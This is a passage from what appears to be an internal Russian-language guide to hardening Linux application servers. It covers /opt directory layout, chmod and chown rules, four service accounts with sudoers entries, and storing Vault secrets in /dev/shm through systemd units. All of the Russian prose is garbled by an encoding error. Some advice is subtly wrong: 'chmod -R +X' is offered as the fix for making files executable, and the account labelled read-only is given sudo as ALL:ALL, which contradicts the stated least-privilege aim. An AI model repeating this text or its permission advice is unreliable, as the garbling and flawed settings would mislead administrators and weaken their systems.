**–ü—Ä–∏–º–µ—Ä:** –ù—É–∂–Ω–æ 1 –ì–ë –¥–ª—è –ü–û, 4 –ì–ë –¥–ª—è –ª–æ–≥–æ–≤, 2 –ì–ë –¥–ª—è –¥–∞–Ω–Ω—ã—Ö (–≤—Å–µ–≥–æ 7 –ì–ë).

**–®–∞–≥ 1: –ü–æ—Ä—Ç–∞–ª –î–ò**
1. –ù–∞–π—Ç–∏ —Å–µ—Ä–≤–µ—Ä
2. –î–æ–±–∞–≤–∏—Ç—å **–ø—É—Å—Ç–æ–π –¥–∏—Å–∫** —Ä–∞–∑–º–µ—Ä–æ–º **7 –ì–ë**
3. **–ù–ï –ú–û–ù–¢–ò–†–û–í–ê–¢–¨** –Ω–∞ –ø–æ—Ä—Ç–∞–ª–µ (–∏–Ω–∞—á–µ –ø—Ä–∞–≤–∞ –±—É–¥—É—Ç root:root)

**–®–∞–≥ 2: RLM**
1. –ù–∞–π—Ç–∏ —Ç–æ—Ç –∂–µ —Å–µ—Ä–≤–µ—Ä
2. –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å—Ü–µ–Ω–∞—Ä–∏–π **"–î–æ–±–∞–≤–ª–µ–Ω–∏–µ/—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º"**
3. –°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã:
   ```
   /opt/myapp     - 1 –ì–ë  (–≤–ª–∞–¥–µ–ª–µ—Ü: myuser_ci)
   /opt/myapp/log - 4 –ì–ë  (–≤–ª–∞–¥–µ–ª–µ—Ü: myuser_sys)
   /opt/myapp/data- 2 –ì–ë  (–≤–ª–∞–¥–µ–ª–µ—Ü: myuser_sys)
   ```
4. **–û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ** –≤—ã—Å—Ç–∞–≤–∏—Ç—å –≤–ª–∞–¥–µ–ª—å—Ü–µ–º –∫–∞–∂–¥–æ–π –§–° —Å–≤–æ–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
- –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –§–° –±–µ–∑ root –ø—Ä–∞–≤
- –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤, –∫–∞—Ç–∞–ª–æ–≥–æ–≤, –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø—Ä–∞–≤
- –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ü–û

---

### –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã —Å–∏—Å—Ç–µ–º–Ω—ã–º –∫–∞—Ç–∞–ª–æ–≥–∞–º

**‚ùå –ó–∞–ø—Ä–µ—â–µ–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏:**
- `/usr/bin`, `/usr/local/bin` ‚Äî –¥–ª—è –±–∏–Ω–∞—Ä–µ–π
- `/var/log` ‚Äî –¥–ª—è –∂—É—Ä–Ω–∞–ª–æ–≤
- `/etc` ‚Äî –¥–ª—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
- `/mnt` ‚Äî –¥–ª—è —Ç–æ—á–µ–∫ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

**‚úÖ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—Ä–∏–∫–ª–∞–¥–Ω—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏:**

| –°–∏—Å—Ç–µ–º–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ | –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ | –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ |
|-------------------|--------------|------------|
| `/var/log` | `/opt/myapp/logs` –∏–ª–∏ `$HOME/.local/log` | –ü—Ä–∏–∫–ª–∞–¥–Ω–∞—è –¢–ú –∏–ª–∏ –¥–æ–º–∞—à–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ |
| `/etc` | `/opt/myapp/etc` –∏–ª–∏ `$HOME/.config` | –ü—Ä–∏–∫–ª–∞–¥–Ω–∞—è –¢–ú –∏–ª–∏ `~/.config` |
| `/usr/bin` | `/opt/myapp/bin` –∏–ª–∏ `$HOME/.local/bin` | –ü—Ä–∏–∫–ª–∞–¥–Ω–∞—è –¢–ú –∏–ª–∏ `~/.local/bin` |
| `/etc/systemd/system` | `$HOME/.config/systemd/user/` | **User Systemd Units** |

**–ü—Ä–∏–º–µ—Ä —Å—Ç—Ä—É–∫—Ç—É—Ä—ã:**
```
/opt/myapp/
‚îú‚îÄ‚îÄ bin/              # –ò—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã
‚îú‚îÄ‚îÄ config/           # –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
‚îÇ   ‚îî‚îÄ‚îÄ app.conf
‚îú‚îÄ‚îÄ data/             # –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
‚îÇ   ‚îî‚îÄ‚îÄ database/
‚îú‚îÄ‚îÄ logs/             # –ñ—É—Ä–Ω–∞–ª—ã
‚îÇ   ‚îú‚îÄ‚îÄ app.log
‚îÇ   ‚îî‚îÄ‚îÄ access.log
‚îî‚îÄ‚îÄ scripts/          # –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã
```

**–î–ª—è —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏—Ö —Å—Å—ã–ª–æ–∫:**
```bash
# ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (—Ç—Ä–µ–±—É–µ—Ç root):
ln -s /opt/myapp/bin/myapp /usr/bin/myapp

# ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:
ln -s /opt/myapp/bin/myapp $HOME/.local/bin/myapp
# –ò –¥–æ–±–∞–≤–∏—Ç—å –≤ PATH: export PATH=$PATH:$HOME/.local/bin
```

---

### –ü—Ä–∞–≤–∏–ª–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞

#### –ü—Ä–æ–±–ª–µ–º–∞ 1: –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π chmod —Å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º —Ñ–ª–∞–≥–æ–º

**‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
chmod 750 -R /opt/myapp
# –ü—Ä–æ–±–ª–µ–º–∞: –í—Å–µ —Ñ–∞–π–ª—ã (–≤–∫–ª—é—á–∞—è –ª–æ–≥–∏) —Å—Ç–∞–Ω—É—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º–∏!
# /opt/myapp/logs/app.log –ø–æ–ª—É—á–∏—Ç –ø—Ä–∞–≤–∞ 750 (–∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π)
```

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å +X (—Ç–æ–ª—å–∫–æ –¥–ª—è –∫–∞—Ç–∞–ª–æ–≥–æ–≤)
chmod -R +X /opt/myapp

# –ò–ª–∏ —Ä–∞–∑–¥–µ–ª—å–Ω–æ:
find /opt/myapp -type d -exec chmod 750 {} \;
find /opt/myapp -type f -exec chmod 640 {} \;
```

---

#### –ü—Ä–æ–±–ª–µ–º–∞ 2: –®–∏—Ä–æ–∫–∏–µ –ø—Ä–∞–≤–∞ (777, o+rw)

**‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
chmod 777 /opt/myapp/config
chmod o+rw /opt/myapp/data
# –ü—Ä–æ–±–ª–µ–º–∞: –õ—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é/–¥–∞–Ω–Ω—ã–µ!
# –í–æ–∑–º–æ–∂–Ω–∞ –ø–æ–¥–º–µ–Ω–∞ —Ñ–∞–π–ª–æ–≤ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–º
```

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ú–∏–Ω–∏–º–∞–ª—å–Ω–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞
chmod 750 /opt/myapp/config  # –í–ª–∞–¥–µ–ª–µ—Ü: rwx, –ì—Ä—É–ø–ø–∞: r-x, –î—Ä—É–≥–∏–µ: ---
chmod 770 /opt/myapp/data    # –í–ª–∞–¥–µ–ª–µ—Ü: rwx, –ì—Ä—É–ø–ø–∞: rwx, –î—Ä—É–≥–∏–µ: ---
```

**‚ö†Ô∏è –û—Å–æ–±–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ –∫ `/tmp`:**
- `/tmp` –¥–æ—Å—Ç—É–ø–µ–Ω –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –Ω–∞ –∑–∞–ø–∏—Å—å
- **–ù–ï –¥–æ–≤–µ—Ä—è–π—Ç–µ** –¥–∞–Ω–Ω—ã–º –∏–∑ `/tmp` (–≤–æ–∑–º–æ–∂–Ω–∞ –ø–æ–¥–º–µ–Ω–∞ —Ñ–∞–π–ª–æ–≤)
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ `/dev/shm` —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤

---

#### –ü—Ä–æ–±–ª–µ–º–∞ 3: –°–º–µ—à–∏–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö, –ª–æ–≥–æ–≤ –∏ –±–∏–Ω–∞—Ä–µ–π

**‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
chown myuser_sys:myuser_sys /opt/myapp
# –ü—Ä–æ–±–ª–µ–º–∞: –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ myuser_sys –º–æ–∂–µ—Ç –ø—Ä–æ–∏–∑–æ–π—Ç–∏ –ø–æ–¥–º–µ–Ω–∞:
# - –î–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
# - –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
# - –°–∞–º–∏—Ö –±–∏–Ω–∞—Ä–µ–π –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥
```

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û: –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ –ø—Ä–∏–Ω—Ü–∏–ø—É –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø–æ–ª–Ω–æ–º–æ—á–∏–π**
```bash
# –ë–∏–Ω–∞—Ä–∏: –í–ª–∞–¥–µ–ª–µ—Ü CI_USER (–¥–µ–ø–ª–æ–π), –ì—Ä—É–ø–ø–∞ SYS_GROUP (–∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ)
chown -R myuser_ci:myuser_sys /opt/myapp/bin
chmod 750 /opt/myapp/bin

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è: –í–ª–∞–¥–µ–ª–µ—Ü CI_USER –∏–ª–∏ ADMIN, –ì—Ä—É–ø–ø–∞ SYS_GROUP (—á—Ç–µ–Ω–∏–µ)
chown -R myuser_ci:myuser_sys /opt/myapp/config
chmod 750 /opt/myapp/config

# –î–∞–Ω–Ω—ã–µ: –í–ª–∞–¥–µ–ª–µ—Ü SYS_USER, –ì—Ä—É–ø–ø–∞ SYS_GROUP (—á—Ç–µ–Ω–∏–µ/–∑–∞–ø–∏—Å—å)
chown -R myuser_sys:myuser_sys /opt/myapp/data
chmod 770 /opt/myapp/data

# –õ–æ–≥–∏: –í–ª–∞–¥–µ–ª–µ—Ü SYS_USER, –ì—Ä—É–ø–ø–∞ SYS_GROUP (—á—Ç–µ–Ω–∏–µ/–∑–∞–ø–∏—Å—å)
chown -R myuser_sys:myuser_sys /opt/myapp/logs
chmod 770 /opt/myapp/logs
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
- –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –°–£–ó ‚Üí **–Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ** –∏–∑–º–µ–Ω–∏—Ç—å –±–∏–Ω–∞—Ä–∏ –∏–ª–∏ –∫–æ–Ω—Ñ–∏–≥–∏
- –ü—Ä–∞–≤–∞ –Ω–∞ –¥–µ–ø–ª–æ–π ‚Üí **—Ç–æ–ª—å–∫–æ —É –¢–£–ó**
- –ü—Ä–∞–≤–∞ –Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ ‚Üí **—Ç–æ–ª—å–∫–æ —É –ü–£–ó**

---

## üîê –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª–Ω–æ–º–æ—á–∏–π

### –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ 4-—Ö —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π

**–ü—Ä–∏–Ω—Ü–∏–ø:** –†–∞—Å–ø–æ–ª–∞–≥–∞–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–π –¢–ú (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/opt/myapp`), —Ä–∞–∑–¥–µ–ª–∏—Ç–µ –Ω–∞ 4 –ø–æ–¥–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –∑–∞–≤–µ–¥–∏—Ç–µ 4 –£–ó.

```
/opt/myapp/
‚îú‚îÄ‚îÄ bin/          # –í–ª–∞–¥–µ–ª–µ—Ü: myapp_ci:myapp_sys    (750)
‚îú‚îÄ‚îÄ config/       # –í–ª–∞–¥–µ–ª–µ—Ü: myapp_ci:myapp_sys    (750)
‚îú‚îÄ‚îÄ data/         # –í–ª–∞–¥–µ–ª–µ—Ü: myapp_sys:myapp_sys   (770)
‚îî‚îÄ‚îÄ logs/         # –í–ª–∞–¥–µ–ª–µ—Ü: myapp_sys:myapp_sys   (770)
```

**–£—á–µ—Ç–Ω—ã–µ –∑–∞–ø–∏—Å–∏:**

| –£–ó | –¢–∏–ø | –ü—Ä–∞–≤–∞ | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|----|-----|-------|-----------|
| `myapp_sys` | –°–£–ó (NoLogin) | –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–æ–≤, —á—Ç–µ–Ω–∏–µ/–∑–∞–ø–∏—Å—å –¥–∞–Ω–Ω—ã—Ö –∏ –ª–æ–≥–æ–≤ | –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è |
| `myapp_admin` | –ü–£–ó (Interactive) | –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–æ–≤, —á—Ç–µ–Ω–∏–µ –ª–æ–≥–æ–≤ | **–ë–ï–ó** –ø—Ä–∞–≤ –Ω–∞ –¥–µ–ø–ª–æ–π |
| `myapp_ci` | –¢–£–ó (Interactive) | –î–µ–ø–ª–æ–π, –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∏–Ω–∞—Ä–µ–π –∏ –∫–æ–Ω—Ñ–∏–≥–æ–≤ | CI/CD –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è |
| `myapp_ro` | ReadOnly | –¢–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥–æ–≤ –∏ –ª–æ–≥–æ–≤ | –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥, –∞—É–¥–∏—Ç |

**Sudoers –ø—Ä–∞–≤–∞ (–ø—Ä–∏–º–µ—Ä—ã):**
```sudoers
# –°–£–ó ‚Üí –±–µ–∑ sudo (–∑–∞–ø—É—Å–∫–∞–µ—Ç —Å–µ—Ä–≤–∏—Å—ã)

# –ü–£–ó ‚Üí –º–æ–∂–µ—Ç —É–ø—Ä–∞–≤–ª—è—Ç—å —Å–µ—Ä–≤–∏—Å–∞–º–∏ –æ—Ç –∏–º–µ–Ω–∏ –°–£–ó
myapp_admin ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user restart myapp
myapp_admin ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user stop myapp
myapp_admin ALL=(myapp_sys) NOPASSWD: NOEXEC: /usr/bin/systemctl --user status myapp

# –¢–£–ó ‚Üí –º–æ–∂–µ—Ç –≤—Å–µ –æ—Ç –∏–º–µ–Ω–∏ –°–£–ó (–¥–ª—è –¥–µ–ø–ª–æ—è)
myapp_ci ALL=(myapp_sys) NOPASSWD: ALL
myapp_ci ALL=(myapp_sys:myapp_sys) NOPASSWD: /usr/bin/chown -R myapp_sys\:myapp_sys /opt/myapp/data

# ReadOnly ‚Üí —Ç–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ
myapp_ro ALL=(ALL\:ALL) NOPASSWD: NOEXEC: /usr/bin/systemctl --user status myapp
myapp_ro ALL=(ALL\:ALL) NOPASSWD: NOEXEC: /usr/bin/journalctl --user -u myapp
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –°–£–ó ‚Üí –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –±–∏–Ω–∞—Ä–∏ –∏–ª–∏ –∫–æ–Ω—Ñ–∏–≥–∏
- ‚úÖ –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –ü–£–ó ‚Üí –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω –¥–µ–ø–ª–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞
- ‚úÖ –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –¢–£–ó ‚Üí –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ —Ç–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–µ–º CI/CD –ø—Ä–æ—Ü–µ—Å—Å–∞
- ‚úÖ ReadOnly ‚Üí –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞ –¥–ª—è –∞—É–¥–∏—Ç–∞

**–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è:**
- –ü—Ä–∏–º–µ—Ä: https://confluence.sberbank.ru/pages/viewpage.action?pageId=19473678382
- –í–∏–¥–µ–æ: 117 —Å—Ç—Ä–∏–º –ú–µ—Ç–ª–∞

---

## üîë –•—Ä–∞–Ω–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤

### –ü–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ SecMan (Vault)

**–ü—Ä–∞–≤–∏–ª–æ:** –ü–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ **–ª—é–±—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤** –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–µ—Å–ø–µ—á–∏—Ç—å –≤ **SecMan** (–æ–Ω –∂–µ Vault).

**–ò–¥–µ–∞–ª—å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç:** –ù–∞—Ç–∏–≤–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ SecMan –≤ –≤–∞—à–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏.

---

### –ï—Å–ª–∏ –Ω–∞—Ç–∏–≤–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç

**–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Vault Agent** –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤.

**–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–π —Å–ø–æ—Å–æ–± —Ö—Ä–∞–Ω–µ–Ω–∏—è:**

#### 1. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `/dev/shm` (tmpfs –≤ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏)

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ –≤ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏
- –£–Ω–∏—á—Ç–æ–∂–∞–µ—Ç—Å—è –ø–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏
- –ù–µ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –Ω–∞ –¥–∏—Å–∫

**–ü—Ä–æ—Ü–µ—Å—Å:**

**–®–∞–≥ 1:** –°–æ–∑–¥–∞—Ç—å –∫–∞—Ç–∞–ª–æ–≥ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
```bash
# –û—Ç –∏–º–µ–Ω–∏ –°–£–ó
sudo -u myapp_sys -g myapp_sys mkdir -p /dev/shm/myapp_secrets
sudo -u myapp_sys -g myapp_sys chmod 700 /dev/shm/myapp_secrets
```

**–ü—Ä–∞–≤–∞:**
- `700` –∏–ª–∏ `750`
- –í–ª–∞–¥–µ–ª–µ—Ü: **—É—á—ë—Ç–∫–∞, –∫–æ—Ç–æ—Ä–æ–π –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å–µ—Ä–≤–∏—Å** (–°–£–ó)
- –ì—Ä—É–ø–ø–∞: **–≥—Ä—É–ø–ø–∞ —Å–µ—Ä–≤–∏—Å–∞**

**–®–∞–≥ 2:** –ü–æ–ª—É—á–∏—Ç—å –∏ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã
```bash
# –ß–µ—Ä–µ–∑ Vault Agent (–æ—Ç –∏–º–µ–Ω–∏ –°–£–ó)
sudo -u myapp_sys vault agent -config=/opt/myapp/config/vault-agent.hcl

# –ò–ª–∏ —á–µ—Ä–µ–∑ Vault CLI
sudo -u myapp_sys vault kv get -field=password secret/myapp/db > /dev/shm/myapp_secrets/db_password.txt
sudo -u myapp_sys chmod 600 /dev/shm/myapp_secrets/db_password.txt
```

**–®–∞–≥ 3:** –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
```bash
# –í ExecStartPre unit —Ñ–∞–π–ª–∞:
ExecStartPre=/usr/bin/bash -c '[ "$(stat -c %U:%G /dev/shm/myapp_secrets)" = "myapp_sys:myapp_sys" ] || exit 1'
ExecStartPre=/usr/bin/bash -c '[ "$(stat -c %a /dev/shm/myapp_secrets)" = "700" ] || exit 1'
```

**–®–∞–≥ 4:** –£–¥–∞–ª–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –ø–æ—Å–ª–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
```bash
# –ï—Å–ª–∏ —Å–µ–∫—Ä–µ—Ç—ã –Ω—É–∂–Ω—ã —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ:
ExecStartPost=/usr/bin/rm -rf /dev/shm/myapp_secrets
```

---

#### 2. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ –∫–∞—Ç–∞–ª–æ–≥–∞

**–ü—Ä–æ–±–ª–µ–º–∞:** `/dev/shm` –æ—á–∏—â–∞–µ—Ç—Å—è –ø–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏.

**–†–µ—à–µ–Ω–∏–µ:** –°–æ–∑–¥–∞–≤–∞—Ç—å –∫–∞—Ç–∞–ª–æ–≥ —á–µ—Ä–µ–∑ `ExecStartPre` –∏–ª–∏ –æ—Ç–¥–µ–ª—å–Ω—ã–π systemd unit.

**–ü—Ä–∏–º–µ—Ä (–≤ systemd unit):**
```ini
[Service]
Type=simple
User=myapp_sys
Group=myapp_sys

# –°–æ–∑–¥–∞—Ç—å –∫–∞—Ç–∞–ª–æ–≥ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º
ExecStartPre=/usr/bin/mkdir -p /dev/shm/myapp_secrets
ExecStartPre=/usr/bin/chmod 700 /dev/shm/myapp_secrets

# –ò–∑–≤–ª–µ—á—å —Å–µ–∫—Ä–µ—Ç—ã
ExecStartPre=/usr/bin/bash -c 'vault kv get -field=password secret/myapp/db > /dev/shm/myapp_secrets/db_password.txt'

# –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
ExecStart=/opt/myapp/bin/myapp --config /opt/myapp/config/app.conf

# –£–¥–∞–ª–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã –ø–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
ExecStartPost=/usr/bin/rm -rf /dev/shm/myapp_secrets
```

---

#### 3. –ü—Ä–∞–≤–∞ –¥–ª—è Vault Agent

**Vault Agent** –¥–æ–ª–∂–µ–Ω –∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å–µ—Ä–≤–∏—Å–∞:
```bash
sudo -u myapp_sys vault agent -config=/opt/myapp/config/vault-agent.hcl
```

**–ò–ª–∏** –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –∞–≥–µ–Ω—Ç—É –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å—å —á–µ—Ä–µ–∑:
- ACL (Access Control Lists)
- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É

---

### ‚ùå –ß—Ç–æ –ó–ê–ü–†–ï–©–ï–ù–û

- ‚ùå –•—Ä–∞–Ω–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ (Git)
- ‚ùå –•—Ä–∞–Ω–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–∞—Ö –Ω–∞ –¥–∏—Å–∫–µ
- ‚ùå –•—Ä–∞–Ω–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è (–≤–∏–¥–Ω—ã —á–µ—Ä–µ–∑ `/proc/<pid>/environ`)
- ‚ùå –•—Ä–∞–Ω–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã –≤ –ª–æ–≥–∞—Ö
- ‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —à–∏—Ä–æ–∫–∏–µ –ø—Ä–∞–≤–∞ –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥ —Å —Å–µ–∫—Ä–µ—Ç–∞–º–∏ (`777`, `755`)

---

## üîß –°–æ–∑–¥–∞–Ω–∏–µ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞–º–∏

### User Systemd Units (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)

